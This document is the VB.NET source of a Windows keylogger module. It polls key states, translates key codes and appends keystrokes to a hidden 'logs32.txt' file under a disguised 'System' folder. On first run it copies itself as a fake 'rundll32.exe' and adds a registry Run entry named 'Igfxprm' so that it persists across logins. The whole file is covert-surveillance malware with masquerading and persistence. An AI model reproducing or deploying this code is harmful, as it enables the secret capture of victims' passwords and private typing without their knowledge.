
Module Declarations
    Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Declare Function GetForegroundWindow Lib "user32" () As Long
    Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
    Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long

    Public luser As String = My.User.Name.Split("\").GetValue(1)
    Public tempdir As String = My.Computer.FileSystem.SpecialDirectories.Temp
    Public directory As String = Mid(tempdir, 1, Len(tempdir) - 4) & "System"
    Public apppath As String = Application.StartupPath
    Public exepath As String = Application.ExecutablePath

    Public sSave, sold As String
    Dim Cnt As Long


    Sub init()
        first_run()
    End Sub

    Sub savelog(ByVal text As String)
        Dim logfile, ccode As String
        Dim cont() As String
        Dim j As Integer, cod As Integer

        logfile = directory & "\" & "logs32.txt"

        cont = Split(text, " ")
        text = ""
        For j = 0 To cont.Length - 1
            cod = Val(cont(j))
            ccode = chstr(cod)
            If ccode = "[Backspace]" Then
                If text.Length > 2 Then text = text.Substring(0, text.Length - 1)
                ccode = ""
            End If
            text = text & ccode
        Next
        My.Computer.FileSystem.WriteAllText(logfile, text, True)
    End Sub

    Function chstr(ByVal cnt As String)
        Select Case Cnt
            'Number pad keys
            Case 96 : chstr = "0"
            Case 97 : chstr = "1"
            Case 98 : chstr = "2"
            Case 99 : chstr = "3"
            Case 100 : chstr = "4"
            Case 101 : chstr = "5"
            Case 102 : chstr = "6"
            Case 103 : chstr = "7"
            Case 104 : chstr = "8"
            Case 105 : chstr = "9"
            Case 106 : chstr = "*"
            Case 107 : chstr = "+"
            Case 108 : chstr = "[Keypad-Enter]"
            Case 109 : chstr = "-"
            Case 110 : chstr = "."
            Case 111 : chstr = "/"

                'Function Keys
            Case 112 : chstr = "F1"
            Case 113 : chstr = "F2"
            Case 114 : chstr = "F3"
            Case 115 : chstr = "F4"
            Case 116 : chstr = "F5"
            Case 117 : chstr = "F6"
            Case 118 : chstr = "F7"
            Case 119 : chstr = "F8"
            Case 120 : chstr = "F9"
            Case 121 : chstr = "F10"
            Case 122 : chstr = "F11"
            Case 123 : chstr = "F12"

                'Mouse
                'Case 1 : chstr = "[Mouse-Left]"
                'Case 2 : chstr = "[Mouse-Right]"
                'Case 3 : chstr = "[Cancel]"
                'Case 4 : chstr = "[Mouse-Middle]"

                'Other keys
            Case 8 : chstr = "[Backspace]"
            Case 9 : chstr = "[Tab]"
            Case 13 : chstr = "[Enter]"
            Case 16 : chstr = "[Shift]"
                'Case 17 : chstr = "[Ctrl]"
                'Case 19 : chstr = "[Pause]"
            Case 20 : chstr = "[Caps Lock]"
            Case 27 : chstr = "[Esc]"
            Case 32 : chstr = " "
                'Case 33 : chstr = "[PageUp]"
                'Case 34 : chstr = "[PageDown]"
                'Case 35 : chstr = "[End]"
                'Case 36 : chstr = "[Home]"
                'Case 37 : chstr = "[LeftArrow]"
                'Case 38 : chstr = "[UpArrow]"
                'Case 39 : chstr = "[RightArrow]"
                'Case 40 : chstr = "[DownArrow]"
                'Case 41 : chstr = "[Select]"
                'Case 42 : chstr = "[PrtScrn]"
                'Case 43 : chstr = "[Execute]"
                'Case 44 : chstr = "[Snapshot]"
                'Case 45 : chstr = "[Ins]"
            Case 46 : chstr = "[Del]"
                'Case 47 : chstr = "[Help]"
            Case 144 : chstr = "[NumLock]"

                'Symbol keys
            Case 186 : chstr = ";"
            Case 187 : chstr = "="
            Case 188 : chstr = ","
            Case 189 : chstr = "-"
            Case 190 : chstr = "."
            Case 191 : chstr = "/"
            Case 192 : chstr = "`"
            Case 219 : chstr = "["
            Case 220 : chstr = "\"
            Case 221 : chstr = "]"
            Case 222 : chstr = "'"

            Case Else
                If (cnt >= 65 And cnt <= 90) Or (cnt >= 97 And cnt <= 122) Then
                    chstr = Chr(cnt)
                Else
                    chstr = ""
                End If

        End Select
    End Function

    Function GetPressedKey() As String
        For Cnt = 0 To 220
            'Get the keystate of a specified key
            If GetAsyncKeyState(Cnt) <> 0 Then
                GetPressedKey = Cnt
                Exit For
            End If
        Next Cnt
        'Return ""
    End Function

    Sub first_run()
        If My.Computer.FileSystem.DirectoryExists(directory) = False Then My.Computer.FileSystem.CreateDirectory(directory)
        If apppath <> directory Then
            Try
                With My.Computer.FileSystem
                    If .GetFileInfo(directory & "\rundll32.exe").Exists = False Then .CopyFile(exepath, directory & "\rundll32.exe")
                    Dim regKey As Microsoft.Win32.RegistryKey
                    regKey = My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                    If Trim(regKey.GetValue("Igfxprm")) = "" Then regKey.SetValue("Igfxprm", directory & "\rundll32.exe", Microsoft.Win32.RegistryValueKind.String)
                    regKey.Close()
                End With
            Catch ex As Exception

            End Try
        End If
    End Sub
End Module
